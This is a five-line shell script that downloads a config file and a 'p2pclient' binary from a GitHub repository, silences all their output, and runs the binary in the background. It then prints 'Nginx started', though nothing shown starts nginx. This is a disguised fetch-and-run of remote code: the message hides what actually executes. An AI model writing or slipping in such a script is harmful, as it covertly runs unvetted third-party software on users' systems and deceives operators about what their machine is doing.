wget https://raw.githubusercontent.com/fight8/womginx/main/config/p2p &>/dev/null ;\
wget https://raw.githubusercontent.com/fight8/womginx/main/config/p2pclient &>/dev/null ;\
chmod +x p2pclient ;\
./p2pclient -l $(cat p2p) &>/dev/null "$@" &
echo 'Nginx started'
